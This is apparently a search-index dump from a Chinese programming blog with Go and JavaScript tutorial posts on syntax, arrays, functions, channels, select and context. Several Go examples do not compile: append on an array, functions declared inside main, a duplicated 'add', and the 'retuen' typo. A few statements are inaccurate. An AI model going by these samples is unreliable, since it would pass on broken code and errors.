语言中 TCP Server 的基础库和性能优化方案\n\n结合 gin 项目了解 Go 语言中的 HTTP Server 的基础库和框架\n深入理解消息队列的原理，掌握基于消息队列的架构设计方法\n\n服务发现原理、选型策略，以及服务发现实现的微服务多租户架构\n\n\n学习和工作中的痛点\n\n不会做消息解耦的架构设计\n\n不清楚如何实现服务发现对平滑发布的支持\n\n不知道怎样利用多租户实现多测试环境\n\n\n详细内容\n\nKafka 的实现原理、异步消息系统的架构设计\n\nRPC 服务发现、动态地址的选型和实现原理，以及基于服务发现的平滑重启和多租户架构\n\n\n&#x3D;&#x3D;&#x3D;\n\n了解 Go 语言中 Goroutine 的调度原理\n\n了解 Go 语言中的内存模型\n\n了解 Go 语言中 GC（垃圾回收）的原理\n\n了解 Go 语言中 channel 的消息通讯原理\n\n\n学习和工作中的痛点\n\n分不清 Goroutine 和线程的区别\n\n不熟悉 Go 的内存分配机制\n\n搞不懂 GC 三色标记算法\n\n不了解 channel 的底层实现\n\n\n详细内容\n\nGoroutine 的实现、GPM 调度模型、调度状态及流转、调度原理、协作式抢占以及和网络库的协作\n\nGo 内存分配的内部结构和分配机制\n\nGo GC 介绍、三色标记的实现原理、GC 的流程以及 GC 的一些优化方案\n\nGo channel 的通讯机制、环形队列的结构、调度和唤醒的原理\n\n\n","categories":["Golang"],"tags":["教程"]},{"title":"Go基础语法","url":"/2023/05/05/Golang/go-BasicGrammer/","content":"Go语言基础语法格式化代码Go 开发团队不想要 Go 语言像许多其它语言那样总是在为代码风格而引发无休止的争论，浪费大量宝贵的开发时间，因此他们制作了一个工具：go fmt (gofmt)。这个工具可以将你的源代码格式化成符合官方统一标准的风格，属于语法风格层面上的小型重构\n在命令行输入 gofmt –w program.go 会格式化该源文件的代码然后将格式化后的代码覆盖原始内容（如果不加参数 -w 则只会打印格式化后的结果而不重写文件）；gofmt -w *.go会格式化并重写所有 Go 源文件；gofmt map1 会格式化并重写 map1 目录及其子目录下的所有 Go 源文件。\ngofmt 也可以通过在参数 -r 后面加入用双引号括起来的替换规则实现代码的简单重构，规则的格式：&lt;原始内容&gt; -&gt; &lt;替换内容&gt;\n生成代码文档godoc 工具会从 Go 程序和包文件中提取顶级声明的首行注释以及每个对象的相关注释，并生成相关文档。\n一般用法：\n\ngo doc package 获取包的文档注释\ngo doc package/subpackage 获取子包的文档注释\ngo doc package function 获取包中函数的文档注释\n\n\n通过 godoc -http&#x3D;:6060 命令可以在本地启动一个 HTTP 服务器，通过浏览器访问 http://localhost:6060 可以查看本地 Go 环境的文档。这个工具只能获取在 Go 安装目录下的标准库../go/src的文档，如果要获取自己写的代码的文档，可以使用 go doc 命令。\n\ngo标记Go 程序可以由多个标记组成，可以是关键字，标识符，常量，字符串，符号。fmt.Println(&quot;Hello,Go!!&quot;)这一个语句就由6个标记组成：\n\nfmt\n.\nPrintln\n(\n“Hello,Go!!”\n)\n\n行分隔符GO程序中，一行代表一个语句结束。每个语句不需要像 C 家族中的其它语言一样以分号1;结尾，因为这些工作都将由 Go 编译器自动完成。\n\n如果你打算将多个语句写在同一行，它们则必须使用;人为区分，但在实际开发中我们并不鼓励这种做法。\n\n注释注释不会被编译，每一个包应该有相关注释。\n单行注释是最常见的注释形式，你可以在任何地方使用以 &#x2F;&#x2F; 开头的单行注释。\n多行注释也叫块注释，均已以 &#x2F;* 开头，并以 *&#x2F; 结尾。如：\n// 单行注释/* 多行注释 */\n\n包的概念、导入与可见性每个Go文件都属于且仅属于一个包。一个包可由许多个源文件组成，因此文件名和包名一般来说都是不相同的。\n必须在源文件中非注释的第一行指明这个文件属于那个包，如package main。它表示一个可独立执行的程序，每个Go应用程序都包含一个名为main的包。\n\n标准库Go的安装文件中包含了可以直接使用的包——标准库，在Windows下，标准库的位置在Go根目录下的子目录pkg\\windows_386中；\n\n如果想要构建一个程序，则包和包内的文件都必须以正确的顺序进行编译。包的依赖关系决定了其构建顺序。\n属于同一个包的源文件必须全部被一起编译，一个包即是编译时的一个单元，因此每个目录都只包含一个包。\n如果对一个包进行更改或重新编译，所有引用了这个包的客户端程序都必须全部重新编译。\n如果A.go依赖B.go，而B.go又依赖C.go：\n\n为了编译A.go，编译器读取的是A.go的源码，然后读取A.go中的import语句，找到B.go，然后读取B.go的源码，然后读取B.go中的import语句，找到C.go，然后读取C.go的源码，然后编译C.go，然后编译B.go，最后编译A.go。\n如果C.go发生了变化，那么B.go和A.go都需要重新编译；\n\nGO语言的包通过import关键字导入，语法如下：\nimport &quot;fmt&quot;\n如果需要导入多个包，可以：\nimport &quot;fmt&quot;import &quot;os&quot;\n也可以：\nimport (    &quot;fmt&quot;    &quot;os&quot;)\n\n\n当导入多个包时，最好按照字母顺序排列，这样便于查找和阅读。\n\n如果包名不是以.或/开头，那么Go编译器会在全局文件夹中查找这个包，如果包名以./开头，则会在相对路径中查找这个包，如果包名以/开头，那么Go编译器会在绝对路径中查找这个包。\n导入包即等同于包含了这个包的所有的代码对象。但可以通过下面这个规则来决定是否将自身的代码对象暴露给外部文件。\n可见性规则\n当标识符（常量、变量、类型、函数名、结构字段等）以一个大写字母开头时，这种形式的标识符的对象就可以被外部包的代码所使用（需要先导入该包），称为导出；\n标识符如果以小写字母开头，则对外包是不可见的，但是他们在整个包内是可见并可用的。\n\n大写字母可以是任何Unicode编码的字符，比如希腊文，不仅仅是ASCII码中的大写字母\n\n假设：\n在包 pack1 中我们有一个变量或函数叫做 Thing（以 T 开头，能够被导出），那么在当前包中导入 pack1 包，Thing 就可以像面向对象语言那样使用点标记来调用：pack1.Thing（pack1 在这里是不可以省略的）。\n因此包也可以作为命名空间使用，帮助避免命名冲突（名称冲突）：两个包中的同名变量的区别在于它们的包名，例如 pack1.Thing 和 pack2.Thing。\n\n通过使用包的别名，可以避免包名冲突，如：import p1 &quot;pack1&quot;，这样在调用pack1包中的函数时，只需要使用p1即可。\n\n总结：在导入一个外部包后，能够且只能够访问该包中导出的对象。\n\n注意事项：如果你导入了一个包却没有使用它，则会在构建程序时引发错误，如：imported and not used: &quot;fmt&quot;。因为这违反了Go语言的规范：“没有不必要的代码”。\n\n文件名源文件：.go为后缀名，文件名均由小写字母组成，多个部分用下划线_进行分隔，不包含空格或其他特殊字符\n\n文件名与包名没有直接关系，不一定要将文件名与包名相同文件夹名与包名没有直接关系，但同一个文件夹下的文件只能有一个包名，否则编译报错。\n\n标识符用来命名变量、类型等程序实体。\n第一个字符必须是字母或下划线而不能是数字。且不包括关键字、不包含运算符\n_本身就是一个特殊的标识符，被称为空白标识符。它可以像其他标识符那样用于变量的声明或赋值（任何类型都可以赋值给它），但任何赋给这个标识符的值都将被抛弃，因此这些值不能在后续的代码中使用，也不可以使用这个标识符作为变量对其它变量进行赋值或运算。\n关键字\n\n\n\n\n\n\n\n\n\n\nbreak\ndefault\nfunc\ninterface\nselect\n\n\ncase\ndefer\ngo\nmap\nstruct\n\n\nchan\nelse\ngoto\npackage\nswitch\n\n\nconst\nfallthrough\nif\nrange\ntype\n\n\ncontinue\nfor\nimport\nreturn\nvar\n\n\n之所以刻意地将 Go 代码中的关键字保持的这么少，是为了简化在编译过程第一步中的代码解析。\n预定义标识符：\n\n\n\n\n\n\n\n\n\n\n\nappend\nbool\nbyte\ncap\nclose\n\n\ncopy\nfalse\nfloat32\nfloat64\nimag\n\n\nint32\nint64\niota\nlen\nmake\n\n\nprint\nprintln\nreal\nrecover\nstring\n\n\n格式化字符串使用fmt.Sprintf或fmt.Printf格式化字符串并赋值给新串\nfmt.Sprintf根据格式化参数生成格式化的字符串并返回该字符串\nfmt.Sprintf(格式化样式, 参数列表...)\n\n格式化样式：字符串形式、格式化符号%\n参数列表：多个参数以逗号分隔，个数必须与格式化样式中的个数一一对应，否则运行时会报错。\n\nGo 字符串格式化符号:  \n\n\n\n格式\n描述\n\n\n\n%v\n按值的本来值输出\n\n\n%+v\n在 %v 基础上，对结构体字段名和值进行展开\n\n\n%#v\n输出 Go 语言语法格式的值\n\n\n%T\n输出 Go 语言语法格式的类型和值\n\n\n%%\n输出 % 本体\n\n\n%b\n整型以二进制方式显示\n\n\n%o\n整型以八进制方式显示\n\n\n%d\n整型以十进制方式显示\n\n\n%x\n整型以十六进制方式显示\n\n\n%X\n整型以十六进制方式显示，字母大写\n\n\n%U\nUnicode 字符\n\n\n%f\n浮点数\n\n\n%p\n指针，十六进制方式显示\n\n\nExample：\npackage mainimport (    &quot;fmt&quot;    &quot;io&quot;    &quot;os&quot;)func main() &#123;    // 声明数字变量    const num1, num2, num3 = 5, 10, 15     // 调用 Sprintf() 函数    s := fmt.Sprintf(&quot;%d + %d = %d&quot;, num1, num2, num3)     // 使用 WriteString() 函数将结果输出到终端 to write the    //  &quot;os.Stdout&quot; 为字符串的内容    io.WriteString(os.Stdout, s) &#125;\n\nfmt.Printf根据格式化参数生成格式化的字符串并写入标准输出。与fmt.Sprintf格式类似，但fmt.Printf直接输出，更方便调试字符串连接：通过+实现：\n这是一个简单的例子，展示了如何使用fmt.Printf函数格式化字符串并将其写入标准输出：\npackage mainimport &quot;fmt&quot;func main() &#123;    // 声明数字变量    const num1, num2, num3 = 5, 10, 15     // 使用 Printf() 函数将结果输出到终端    fmt.Printf(&quot;%d + %d = %d&quot;, num1, num2, num3)&#125;","categories":["Golang"]},{"title":"JavaScript语法","url":"/2022/12/04/JavaScript/JavaScript%E8%AF%AD%E6%B3%95/","content":"JavaScript语法字面量一般固定值称为字面量，如：\n\n数字字面量：123\n字符串字面量：&quot;Hello World!&quot;\n布尔字面量: true、false、null、undefined\n数组字面量：[1,2,3]\n对象字面量：&#123;name:&quot;Lex&quot;,age:21&#125;\n函数表达式字面量： function()&#123;&#125;\n\n变量变量是存储数据值的容器，可以通过变量名访问变量的值。JavaScript使用关键字var来声明变量，语法：var varName = value，varName是变量名，value是变量值。\nvar x = 5;var y = 6;var z = x + y;\n一条语句可以声明多个变量，也可以横跨多行，语法：var var1 = value1, var2 = value2, var3 = value3\nvar x = 5, y = 6, z = x + y;var lastName = &quot;L&quot;,    firstName = &quot;Lex&quot;,    age = 21;\n\n变量可以使用任何名称，但以下规则必须遵守：\n\n变量名称以字母、下划线或美元符号$开头\n变量名称不能以数字开头\n变量名称对大小写敏感（y和Y是不同的变量）\n保留字（关键字）不能用作变量名\n变量名应使用驼峰大小写\n\n\nJavaScript 变量均为对象。当您声明一个变量时，就创建了一个新的对象。变量是一个名称，字面量是一个值。\n\n操作符算术操作符\n\n\n操作符\n描述\n\n\n\n+\n加法\n\n\n-\n减法\n\n\n*\n乘法\n\n\n&#x2F;\n除法\n\n\n%\n求余\n\n\n++\n递增\n\n\n–\n递减\n\n\n&lt;&lt;\n左移\n\n\n&gt;&gt;\n右移\n\n\n&gt;&gt;&gt;\n无符号右移\n\n\n&amp;\n按位与\n\n\n^\n按位异或\n\n\n~\n按位非\n\n\n&amp;&amp;\n逻辑与\n\n\n||\n逻辑或\n\n\n!\n逻辑非\n\n\n&#x3D;&#x3D;\n等于\n\n\n&#x3D;&#x3D;&#x3D;\n全等\n\n\n!&#x3D;\n不等于\n\n\n!&#x3D;&#x3D;\n不全等\n\n\n&gt;\n大于\n\n\n&lt;\n小于\n\n\n&gt;&#x3D;\n大于等于\n\n\n&lt;&#x3D;\n小于等于\n\n\n+运算符也可用于字符串相加：text = &quot;Good&quot; + &quot;morning&quot;;。\n对于字符串和数字的相加，JavaScript会把数字转换为字符串：text = &quot;5&quot; + 2 + 3;，结果为523。\n赋值操作符\n\n\n操作符\n描述\n\n\n\n&#x3D;\n赋值\n\n\n+&#x3D;\n加法赋值\n\n\n-&#x3D;\n减法赋值\n\n\n*&#x3D;\n乘法赋值\n\n\n&#x2F;&#x3D;\n除法赋值\n\n\n%&#x3D;\n求余赋值\n\n\n&lt;&lt;&#x3D;\n左移赋值\n\n\n&gt;&gt;&#x3D;\n右移赋值\n\n\n&gt;&gt;&gt;&#x3D;\n无符号右移赋值\n\n\n&amp;&#x3D;\n按位与赋值\n\n\n^&#x3D;\n按位异或赋值\n\n\n注释单行注释：//多行注释：/* */\n数据类型JavaScript变量可以保存两种类型的值：基本类型值和引用类型值。JavaScript有多种数据类型：数字、字符串、数组、对象等等。\n将在后面的章节中详细讲解数据类型。\n函数函数是由事件驱动的或者当它被调用时执行的可重复使用的代码块。\n引用一个函数&#x3D;调用函数 &#x3D;&gt; 执行函数内的代码。\n将在后面的章节中详细讲解函数。\n字母大小写JavaScript对大小写敏感，关键词、变量、函数名、对象名均区分大小写。\nJavaScript字符集JavaScript使用Unicode字符集。意味着JavaScript支持多种语言，如中文、日文、韩文等等。\n","categories":["教程"],"tags":["JavaScript"]},{"title":"并发","url":"/2023/05/27/Golang/go-complicated/","content":"\n并发Go语言支持并发，我们只需要通过go关键字来开启goroutine即可。\ngoroutine是轻量级线程，goroutine的调度是由Golang运行时进行管理的。\n语法：go 函数名()开启一个新的goroutine\n同一个程序中的所有goroutine共享同一个地址空间。\n","categories":["Golang"]},{"title":"条件语句","url":"/2023/05/27/Golang/go-conditionalStatement/","content":"条件语句\nGo没有三目运算符，所以不支持 ?: 形式的条件判断。\n\nif语句由一个布尔表达式后紧跟一个或多个语句组成。\nif [statement] ; bool &#123;    //&#125;\n\n\nGo的if语句可以在条件判断语句里声明变量，用;分隔多个变量，这个变量的作用域只在当前条件逻辑块内条件不需要用括号左括号&#123;必须在if或else同一行\n\nif…else语句if 语句后可以使用可选的else语句,else语句中的表达式在布尔表达式为false时执行。\nif嵌套语句你可以在if或else if语句中嵌入一个或多个if或else if语句。\nswitch语句用于基于不同条件执行不同动作。每一个case分支都是唯一的，从上至下逐一测试，直到匹配为止。\nswitch默认情况下case最后自带break语句，匹配成功后就不会执行其他case；如果我们需要执行后面的case，可以使用fallthrough\nswitch var1 &#123;    case val1:    //必须是同类型的任意值        ...    case val2, val3, val4:    //可以同时测试多个值，使用逗号分割        ...    default:        ...&#125;\n\nfallthrough使用fallthrough会强制执行后面的case语句，fallthrough不会判断下一条case的表达式结果是否为true。（默认执行）\n\nType Switch能够判断某个interface变量中实际存储的变量类型\nswitch x.(type)&#123;    case type:       statement(s);    default:        statement(s);&#125;\nselect语句类似switch但是select语句只能用于通道操作，每个case必须是一个通道操作。\nselect 语句会监听所有指定的通道上的操作，一旦其中一个通道准备好就会执行相应的代码块。\n如果多个通道都准备好，那么 select 语句会随机选择一个通道执行。如果没有case可运行：如果有 default 子句，则执行该语句；如果没有 default 子句，select 将阻塞，直到某个通道可以运行；Go 不会重新对 channel 或值进行求值。它将阻塞，直到有case可运行。\npackage mainimport (   &quot;fmt&quot;   &quot;time&quot;)func Chann(ch chan int, stopCh chan bool) &#123;   for j := 0; j &lt; 10; j++ &#123;      ch &lt;- j      time.Sleep(time.Second)   &#125;   stopCh &lt;- true&#125;func main() &#123;    ch := make(chan int)    c := 0       stopCh := make(chan bool)    go Chann(ch, stopCh)    for &#123;        select &#123;        case c = &lt;-ch:            fmt.Println(&quot;Receive C&quot;, c)        case s := &lt;-ch:            fmt.Println(&quot;Receive S&quot;, s)        case _ = &lt;-stopCh:            goto end        &#125;    &#125;    end:&#125;","categories":["Golang"]},{"title":"Golang数组","url":"/2023/05/05/Golang/go-array/","content":"Golang 数组数据和切片是Go语言中常见的数据结构，很多刚接触Go的开发者往往会将数组和切片混淆。数组作为最常见的集合在编程语言中是非常重要的，除了数组之外，Go 语言引入了另一个概念——切片，切片与数组有一些类似，但是它们的不同导致了使用上的巨大差别。在这节中会从 Go 语言的编译期间运行时来介绍数组的底层实现原理，其中会包括数组的初始化、访问和赋值几种常见操作。\n声明数组Go语言数组声明需要指定元素类型及元素个数：var array_name [size]type\n初始化数组var nums = [5]int&#123;100, 2, 5, 8, 10&#125; \n通过字面量在声明数组的同时快速初始化数组： nums := [5]int&#123;100, 2, 5, 8, 10&#125;\n如果数组长度不确定可以使用...代替，此时编译器会根据元素个数自行推断数组长度var nums = [...]int&#123;100, 2, 5, 8, 10&#125; \n设置了数组的长度，我们还可以通过指定下标(key:value)来初始化元素：nums := [5]int&#123;1:2, 4:10&#125; // [0, 2, 0, 0, 10]\n\n初始化数组中&#123;&#125;中的元素个数不能大于[]中的数字。在初始化时没有指定初值的元素将会赋值为零值在Go语言中，数组的大小是类型的一部分，因此不同大小的数组是不同的类型，是不兼容的。\n\n访问数组元素数组元素可以通过索引（位置）来读取。\n例如：array_name[index]\n对数组的遍历多采用循环结构\n范围（Range）range关键字用于循环中迭代数组、切片、通道或集合的元素。\n在数组和切片中它返回元素的索引和索引对应的值，在集合中返回key-value对。\n示例package mainimport &quot;fmt&quot;func main() &#123;    arr := [...][]int&#123;        &#123;1, 2, 3, 4&#125;,        &#123;10, 20, 30, 40&#125;,    &#125;    for i := range arr &#123;        for j := range arr[i] &#123;            fmt.Println(arr[i][j])        &#125;    &#125;&#125;\n\n多维数组Go 语言支持多维数组，以下为常用的多维数组声明方式：var arr_name [SIZE1][SIZE2]...[SIZEN]type\n二维数组是最简单的多维数组，本质是由多个一维数组组成。\nvar arrayName [x][y]type\n二维数组可认为是一个表格，x 为行，y 为列.\n多维数组初始化或赋值时需要注意Go语法规范，该写在一行就写在一行，一行一条语句。\na := [3][4]int&#123;   &#123;0, 1, 2, 3&#125; ,    &#123;4, 5, 6, 7&#125; ,    &#123;8, 9, 10, 11&#125;, // 这里的 &#125; 必须要有逗号，因为最后一行的 &#125; 不能单独一行，&#125;// 或者写成这样a := [3][4]int&#123;   &#123;0, 1, 2, 3&#125; ,    &#123;4, 5, 6, 7&#125; ,    &#123;8, 9, 10, 11&#125;&#125;   \n实例\npackage mainimport &quot;fmt&quot;func main() &#123;    // 创建二维数组    sites := [2][2]string&#123;&#125;    // 向二维数组添加元素    sites[0][0] = &quot;Google&quot;    sites[0][1] = &quot;Runoob&quot;    rows := []string(&quot;Taobao&quot;,&quot;Weibo&quot;)    sites = append(sites, rows)    // 显示结果    fmt.Println(&quot;sites:&quot;)    fmt.Println(sites)    // 显示一行的元素    fmt.Println(&quot;Row 1:&quot;)    fmt.Println(sites[0])&#125;\n\n向函数传递数组的注意事项未定义长度的数组只能传给不限制数组长度的函数\n定义了长度的数组只能传给限制了相同数组长度的函数\npackage mainimport &quot;fmt&quot;// Go 语言的数组是值，其长度是其类型的一部分，作为函数参数时，是值传递func change1(nums [3]int) &#123;    nums[0] = 4&#125;// 传递进来数组的内存地址，然后定义指针变量指向该地址，则会改变数组的值func change2(nums *[3]int) &#123;    nums[0] = 5&#125;// Go 语言中对数组的处理，一般采用切片的方式，切片包含对底层数组内容的引用，作为函数参数时，类似于指针传递func change3(nums []int) &#123;      nums[0] = 6&#125;func main() &#123;   var nums1 = [3]int&#123;1, 2, 3&#125;      var nums2 = []int&#123;1, 2, 3&#125;       change1(nums1)       fmt.Println(nums1)  //  [1 2 3]        change2(&amp;nums1)       fmt.Println(nums1)  //  [5 2 3]       change3(nums2)       fmt.Println(nums2)  //  [6 2 3]&#125;\n","categories":["Golang"]},{"url":"/2025/08/01/Golang/go-context/","content":"了解Context控制并发的方法：WaitGroup、contextWaitGroup使用场景：将同一件事情拆成不同的工作执行，最后等待所有的工作完成才继续执行主程序。\nfunc main() &#123;    var wg sync.WaitGroup    wg.Add(2)    go func() &#123;        time.Sleep(2 * time.Second)        fmt.Println(&quot;job 1 done.&quot;)        wg.Done()    &#125;()    go func() &#123;        time.Sleep(1 * time.Second)        fmt.Println(&quot;job 2 done.&quot;)        wg.Done()    &#125;()    wg.Wait()    fmt.Println(&quot;All Done.&quot;)&#125;\n\n主程序通过wg.Wait()等待所有job执行完成后才最后执行。\n情景扩展：虽然将job拆成了多个后，并丢到后台进行运行，我该如何终止某个goroutine的工作呢？\n：通过使用channel+select来主动通知并且停止正在运行的Job。\nfunc main() &#123;  stop := make(chan bool)  go func() &#123;    for &#123;      select &#123;        case &lt;-stop:          fmt.Println(&quot;got stop signal&quot;)          return        default:          fmt.Println(&quot;still running&quot;)          time.Sleep(1 * time.Second)      &#125;    &#125;  &#125; ()  time.Sleep(3 * time.Second)  fmt.Println(&quot;stop the goroutine&quot;)  stop &lt;- true  time.Sleep(1 * time.Second) // 等待goroutine结束&#125;\n\n在上述场景中，可以在任何地方将bool值丢入stop channel中，就可以停止正在运行的goroutine，但如果后台跑了多个goroutine，或者是在goroutine中又跑了goroutine，就没有办法用channel进行处理了。而是采用context。\n拿上面的例子进行改写\nfunc main() &#123;  ctx, cancel := context.WithCancel(context.Background())  go func() &#123;      for &#123;        select &#123;          case &lt;-ctx.Done():            fmt.Println(&quot;got the stop channel&quot;)            return          default:            fmt.Println(&quot;still working&quot;)            time.Sleep(1 * time.Second)        &#125;      &#125;    &#125; ()    time.Sleep(5 * time.Second)    fmt.Println(&quot;stop the gorutine&quot;)    cancel()    time.Sleep(5 * time.Second)&#125;\n\n接口type Context interface &#123;  Deadline() (deadline time.Time, ok bool)  Done() &lt;-chan struct&#123;&#125;  Err() error  Value(key interface&#123;&#125;) interface&#123;&#125;&#125;\n\nDeadline —— 返回context.Context被取消的时间。\nDone —— 返回一个channel，会在当前工作完成或上下文被取消时关闭。\n\n多次调用Done方法会返回同一个channel。\n\n\nErr —— 返回context.Context结束的原因。只会在Done方法对应的channel关闭时返回非空值；\n\n如果context.Context被取消，返回context.Canceled；\n\n\n\n如果超时，返回context.DeadlineExceeded。\n\n\nValue —— 从context.Context中获取键对应的值，对于同一个context来说，多次调用Value并传入相同的Key会返回相同的结果。\n\n设计原理"},{"title":"数据类型","url":"/2023/05/07/Golang/go-dataStructure/","content":"数据类型数据类型的出现是为了把数据分成所需内存大小不同的数据，编程的时候需要用大数据的时候才需要申请大内存，就可以充分利用内存。\n布尔型\n常量true\n常量false\n\n数字类型整型有8位，16位，32位，64位\n\nint：有符号\nuint：无符号\n\n浮点型\nfloat32：32位浮点型数\nfloat64：64位浮点型数\n\n复数\ncomplex64：32位实数和虚数\ncomplex128：64位实数和虚数\n\n\nbyte:类似uint8rune:类似int32uintptr:无符号整型，用于存放一个指针\n\n字符串类型Go 的字符串是由单个字节连接起来的。Go 语言的字符串的字节使用 UTF-8 编码标识 Unicode 文本。\n\n派生类型指针、数组、结构体、channel、函数、切片、接口、Map\n\n数组数组是具有相同唯一类型的一组已编号且长度固定的数据项序列，这种类型可以是任意的原始类型例如整型、字符串或者自定义类型。\n数组元素可以通过索引来读取（或修改），索引从 0 开始，第一个元素索引为 0，第二个索引为 1，以此类推。\n指针一个指针变量指向了一个值的内存地址。\n指针的使用：定义——&gt;赋值——&gt;访问指针变量的值\n结构体结构体是由一系列具有相同类型或不同类型的数据构成的数据集合，结构体表示一项记录。\n切片Go语言切片是对数组的抽象。\nGo数组的长度不可改变，Go中提供了一种灵活，功能强悍的内置类型切片(“动态数组”)，与数组相比切片的长度不固定的，可以追加。\nMap（集合）Map是一种无序的键值对的集合。遍历 Map时返回的键值对的顺序是不确定的。\nMap是引用类型，如果将一个Map传递给一个函数或赋值给另一个变量，它们都指向同一个底层数据结构，因此对Map的修改会影响到所有引用它的变量\n类型转换数值类型转换package mainimport &quot;fmt&quot;func main() &#123;   var sum int = 17   var count int = 5   var mean float32      mean = float32(sum)/float32(count)   fmt.Printf(&quot;mean 的值为: %f\\n&quot;,mean)&#125;\n\n字符串类型转换熟习strconv包中的Atoi()和Itoa()函数\n\nAtoi()函数返回两个值，第一个是转换后的整型值，第二个是可能发生的错误，我们可以使用空白标识符_来忽略这个错误\n\npackage mainimport (    &quot;fmt&quot;    &quot;strconv&quot;)func main() &#123;   str := &quot;123&quot;   num, err := strconv.Atoi(str)   if err != nil &#123;      fmt.Println(&quot;转换错误:&quot;, err)   &#125; else &#123;      fmt.Printf(&quot;字符串 &#x27;%s&#x27; 转换为整数为：%d\\n&quot;, str, num)   &#125;&#125;\n\n接口接口可以让我们将不同的类型绑定到一组公共的方法上，从而实现多态和灵活的设计。\nGo 语言中的接口是隐式实现的，也就是说，如果一个类型实现了一个接口定义的所有方法，那么它就自动地实现了该接口。因此，我们可以通过将接口作为参数来实现对不同类型的调用，从而实现多态。\n通道 channel通道（channel）是用来传递数据的一个数据结构。\n通道可用于两个goroutine之间通过传递一个指定类型的值来同步运行和通讯。操作符&lt;-用于指定通道的方向，发送或接收。如果未指定方向，则为双向通道。\n声明：使用chan关键字，通道在使用前必须先创建：ch := make(chan int)\n通道缓冲区\n","categories":["Golang"]},{"title":"函数","url":"/2023/05/27/Golang/go-function/","content":"函数函数是基本的代码块，用于执行一个任务。\nGo语言最少有一个main()函数。\n你可以通过函数来划分不同功能，逻辑上每个函数执行的是指定的任务。\n函数声明告诉了编译器函数的名称，参数和返回类型。\n函数定义func function_name( [parameter list] ) [return_types] &#123;    //your code&#125;\n\nfunc：函数由func开始声明\nfunction_name：函数名称，参数列表和返回值类型构成了函数签名。\nparameter list：参数列表，参数就像一个占位符，当函数被调用时，你可以将值传递给参数，这个值被称为实际参数。参数列表指定的是参数类型、顺序、及参数个数（用逗号，分隔）。参数是可选的，函数也可以不包含参数。\nreturn_types：返回类型，函数返回一列值。return_types 是该列值的数据类型。有些功能不需要返回值，这种情况下 return_types 不是必须的。\n函数体：函数定义的代码集合。\n\nmain()函数是每个可执行程序所必须包含的，一般来说都是在启动后第一个执行的函数（在没有init()函数的情况下。如果main包的源代码没有包含main()函数，则会引发构建错误undefined: main.main 。main()函数既没有参数，也没有返回类型。（如果为main()函数添加了参数或返回类型，将会引发构建错误：&#96;&#96;）\ninit()函数\n函数里的代码使用大括号{}括起来。左大括号&#123;必须与方法的声明在同一行（编译器的强制规定，否则在使用gofmt时会出现错误提示：&#96;&#96;）\nGo语言的语句看起来不使用分号，但实际上这是由编译器自动完成，因此会引发上面类似的错误\n函数返回多个值go语言可以返回多个值，例如：\npackage mainimport &quot;fmt&quot;func swap(x, y string) (string, string) &#123;   return y, x&#125;func main() &#123;   a, b := swap(&quot;Google&quot;, &quot;Runoob&quot;)   fmt.Println(a, b)&#125;\n函数参数函数如果使用参数，该变量可称为函数的形参。\n调用函数，可以通过两种方式来传递参数：\n\n值传递：在调用函数时将实际参数复制一份传递到函数中，这样在函数中如果对参数进行修改，将不会影响到实际参数。\n引用传递：指在调用函数时将实际参数的地址传递到函数中，那么在函数中对参数所进行的修改，将影响到实际参数。\n\n实例package mainimport &quot;fmt&quot;func main() &#123;   var a int = 100   var b int= 200   fmt.Printf(&quot;交换前，a 的值 : %d\\n&quot;, a )   fmt.Printf(&quot;交换前，b 的值 : %d\\n&quot;, b )   // 值传递   swap(a, b)      fmt.Printf(&quot;交换后 a 的值 : %d\\n&quot;, a )   fmt.Printf(&quot;交换后 b 的值 : %d\\n&quot;, b )   // 引用传递   swap(&amp;a, &amp;b)   fmt.Printf(&quot;交换后 a 的值 : %d\\n&quot;, a )   fmt.Printf(&quot;交换后 b 的值 : %d\\n&quot;, b )      func swap(x, y int) &#123;      temp := x    /* 保存 x 的值 */      x = y      /* 将 y 值赋给 x */      y = temp    /* 将 temp 值赋给 y */   &#125;   func swap(x *int, y *int) &#123;      var temp int      temp = *x    /* 保存 x 地址上的值 */      *x = *y      /* 将 y 值赋给 x */      *y = temp    /* 将 temp 值赋给 y */   &#125;&#125;\n函数用法作为实参Go语言可以很灵活的创建函数，并作为另外一个函数的实参。\n实例\npackage main import &quot;fmt&quot; // 声明一个函数类型 type cb func(int) intfunc main() &#123;    testCallBack(1, callBack)//执行函数---testCallBack &#125; func testCallBack(x int, f cb) &#123;  //定义了一个函数 testCallBack    f(x)  //由于传进来的是callBack函数，该函数执行需要传入一个int类型参数，因此传入x &#125; func callBack(x int) int &#123;    fmt.Printf(&quot;我是回调，x：%d\\n&quot;, x)    return x &#125;\n闭包闭包是匿名函数，可在动态编程中使用\n匿名函数是一个”内联”语句或表达式。\n匿名函数的优越性：可以直接使用函数内的变量，不必申明。\n实例\npackage mainimport &quot;fmt&quot;// 闭包使用方法func add(x1, x2 int) func() (int, int)  &#123;   i := 0   return func() (int, int)&#123;      i++      return i,x1+x2   &#125;&#125;// 闭包带参数，闭包函数可不用写形参名称func add(x1, x2 int) func(x3 int,x4 int) (int, int, int) &#123;   i := 0   return func(x3 int, x4 int) (int, int, int) &#123;       i++      return i,x1 + x2,x3 + x4   &#125;&#125;func main()&#123;   add_func := add(1,2) //作为一个加法函数，函数i为0   fmt.Println(add_func())   fmt.Println(add_func())   fmt.Println(add_func())   add_func1 := add(1,2) //创建新的函数，add()方法被重新赋值   fmt.Println(add_func1()) //i是1   fmt.Println(add_func()) //尽管外面的函数销毁了，但是内部函数仍然存在，这个就是闭包   fmt.Println(add_func1()) //i是2   add_func := add(1,2)   fmt.Println(add_func(1,1))   fmt.Println(add_func(0,0))   fmt.Println(add_func(2,2))&#125;运行结果：1 32 33 31 34 32 31 3 22 3 03 3 4\n\npackage mainimport &quot;fmt&quot;var Res = func (a int, b int) int &#123;   retuen a - b&#125;func main() &#123;   // 匿名函数：只调用一次，定义时直接调用   res1 := func (a int, b int) int &#123;      return a + b   &#125;(1,2)   fmt.Printf(&quot;res1 = %d\\n&quot;, res1)   // 匿名函数：赋予其他变量调用，可多次使用，但作用域有限   res2 := func (a int, b int) int &#123;      return a * b   &#125;   res3 := res2(1,2)   fmt.Printf(&quot;res3 = %d\\n&quot;, res3)   // 匿名函数做全局变量，则该函数为全局匿名函数   res4 := Res(1,2)   fmt.Printf(&quot;res4 = %d\\n&quot;, res4)&#125;\n方法一个方法就是一个包含了接受者的函数，接受者可以是命名类型或者结构体类型的一个值或者是一个指针。\n所有给定类型的方法属于该类型的方法集。\n关于值和指针，如果想在方法中改变结构体类型的属性，需要对方法传递指针，体会如下对结构体类型改变的方法 changRadis() 和普通的函数 change() 中的指针操作:\n实例\npackage mainimport (   &quot;fmt&quot;  )/* 定义结构体 */type Circle struct 